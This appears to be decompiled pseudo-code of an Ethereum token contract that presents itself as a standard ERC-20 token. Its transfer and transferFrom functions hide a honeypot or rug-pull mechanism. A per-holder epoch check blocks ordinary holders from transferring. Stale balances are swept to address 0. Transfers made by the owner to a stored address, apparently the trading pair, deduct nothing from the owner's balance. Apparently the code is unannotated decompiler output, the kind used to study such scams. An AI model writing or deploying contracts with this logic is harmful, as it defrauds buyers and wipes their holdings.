contract main {




// =====================  Runtime code  =====================


address owner;
mapping of struct balanceOf;
mapping of uint256 allowance;
array of uint256 name;
array of uint256 symbol;
address stor5;
uint8 decimals; offset 160
address stor6;
uint256 totalSupply;
uint256 stor8;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function decimals() {
    return decimals
}

function balanceOf(address arg1) {
    return balanceOf[address(arg1)].field_0
}

function getOwner() {
    return owner
}

function symbol() {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) {
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function approve(address arg1, uint256 arg2) {
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) {
    if owner != msg.sender:
        require balanceOf[address(msg.sender)].field_256 == stor8
    if balanceOf[address(arg1)].field_0:
        if balanceOf[address(arg1)].field_256 != stor8:
            require balanceOf[0].field_0 + balanceOf[address(arg1)].field_0 >= balanceOf[0].field_0
            balanceOf[0].field_0 += balanceOf[address(arg1)].field_0
            balanceOf[address(arg1)].field_0 = 0
    if stor5 != msg.sender:
        balanceOf[address(arg1)].field_256 = stor8
    else:
        require stor8 + 1 >= stor8
        balanceOf[stor5].field_256 = stor8 + 1
        balanceOf[stor6].field_256 = stor8 + 1
        balanceOf[address(arg1)].field_256 = stor8 + 1
        stor8++
    require arg2 <= balanceOf[address(msg.sender)].field_0
    balanceOf[address(msg.sender)].field_0 -= arg2
    require balanceOf[address(arg1)].field_0 + arg2 >= balanceOf[address(arg1)].field_0
    balanceOf[address(arg1)].field_0 += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    if arg1 != owner:
        require balanceOf[address(arg1)].field_256 == stor8
    if balanceOf[address(arg2)].field_0:
        if balanceOf[address(arg2)].field_256 != stor8:
            require balanceOf[0].field_0 + balanceOf[address(arg2)].field_0 >= balanceOf[0].field_0
            balanceOf[0].field_0 += balanceOf[address(arg2)].field_0
            balanceOf[address(arg2)].field_0 = 0
    if arg1 != stor5:
        balanceOf[address(arg2)].field_256 = stor8
    else:
        require stor8 + 1 >= stor8
        balanceOf[stor5].field_256 = stor8 + 1
        balanceOf[stor6].field_256 = stor8 + 1
        balanceOf[address(arg2)].field_256 = stor8 + 1
        stor8++
    if stor6 != msg.sender:
        require arg3 <= balanceOf[address(arg1)].field_0
        balanceOf[address(arg1)].field_0 -= arg3
    else:
        if arg1 != owner:
            require arg3 <= balanceOf[address(arg1)].field_0
            balanceOf[address(arg1)].field_0 -= arg3
        else:
            if arg2 != stor5:
                require arg3 <= balanceOf[address(arg1)].field_0
                balanceOf[address(arg1)].field_0 -= arg3
    require arg3 <= allowance[address(arg1)][address(msg.sender)]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    require balanceOf[address(arg2)].field_0 + arg3 >= balanceOf[address(arg2)].field_0
    balanceOf[address(arg2)].field_0 += arg3
    if not stor5:
        if arg1 == owner:
            stor5 = arg2
    if not stor6:
        if arg1 == owner:
            stor6 = msg.sender
    if stor8 == 1643702535:
        require stor8 + 1 >= stor8
        require 1 <= stor8 + 1
    emit Transfer(arg3, arg1, arg2);
    return 1
}



}
